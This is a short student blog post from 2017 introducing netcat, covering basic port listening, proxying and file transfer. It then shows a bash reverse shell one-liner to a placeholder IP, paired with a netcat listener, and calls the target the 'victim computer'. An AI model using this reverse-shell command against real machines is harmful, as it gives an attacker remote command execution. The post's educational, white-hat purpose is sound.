---
layout: post
title:  "Netcat: Woah"
date:   2017-02-24 14:43:20 +0000
---


File this one under semi-relevant but super neat. My first exposure to netcat was through an offhand comment made by our instructor Steven, in which he said it was pretty crazy. If i’ve learned anything about Steven, with his background in network security, it’s to pay attention to the things he mentions as cool, because they probably are. This was no exception. In this blog post, I’ll cover some of the basics of netcat, as well as some neat tricks you can do with it. 

	Type “man nc” into your terminal and even the first couple of lines are intriguing. Not even the first couple of lines in your iPhone’s manual were intriguing, so this is already a good start:
	“nc -- arbitrary TCP  and UDP connections and listens… the nc (or netcat) utility is used for just about anything under the sun involving TCP or UDP.”

	Having learned all about how the internet works earlier this week we, we were exposed to TCP and UDP as part of the transport layer in the internet protocol suite. Simply put, these protocols allow for the transference of data via hosts communicating by an IP network. As such, netcat was originally conceived as a network utility for reading and writing to network connections, a general-purpose networking tool. 

Some basic applications of nc include:

Checking if ports on the network are open
To listen for connections on TCP port 8080. : nc -l 8080
Creating an HTTP proxy server:
 To create a proxy server on localhost port 8888. : nc -l --proxy-type http localhost 8888
Encrypted file transfer: 
When you SSH in, add -L 31000:127.0.0.1:31000
On the remote: nc -lvnp 31000 127.0.0.1 > file
On the local: nc -v -w 2 127.0.0.1 31000 < file

	Clearly this is an extremely versatile and useful tool for diagnosing problems on a network. However beyond that, nc is also a favorite tool of hackers, known to some as  “the swiss army knife of hacking tools”. From the examples above, even successfully sending an encrypted file has obvious hacking applications. However, in order for the file to be opened on the remote, someone needs to be on the receiving end typing in the command. Or do they? 
	
	![]( http://giphy.com/gifs/rick-and-morty-1107IdxsMU7I6khttp://)
	
	
	
	One tricky thing that nc can be used to do is to create a reverse shell to remotely execute commands over any open port using netcat or BASH. A reverse shell is a type of shell in which another ‘attacking’ machine can execute commands. You can create one with a single line of code : bash -i >& /dev/tcp/youripaddress/1337 0>&1
Next, we create a backdoor with our trusty friend netcat: nc -l 1337    

And voila, we’re done(more or less). You can use this to make the victim computer do funny things like speaking out loud: “say [thing]”, and beyond that more malicious applications are pretty apparent. 

	So, being a student of code and its legal applications, why would I want to learn such a thing? Online, there’s a type of hacker called a “white hat,” someone who uses hacker’s tools for educational and non-malicious purposes. If I am to contribute to helping preserve and develop online infrastructure, a deep understanding of all of the tools at our disposal is crucial, regardless of how fun they are.



Sources: 
https://www.sans.org/security-resources/sec560/netcat_cheat_sheet_v1.pdf  
https://en.wikipedia.org/wiki/Netcat (yes I’m listing Wikipedia as a source, just bein’ honest!) 
http://www.thegeekstuff.com/2012/04/nc-command-examples/?utm_source=feedburner
https://null-byte.wonderhowto.com/how-to/create-reverse-shell-remotely-execute-root-commands-over-any-open-port-using-netcat-bash-0132658/

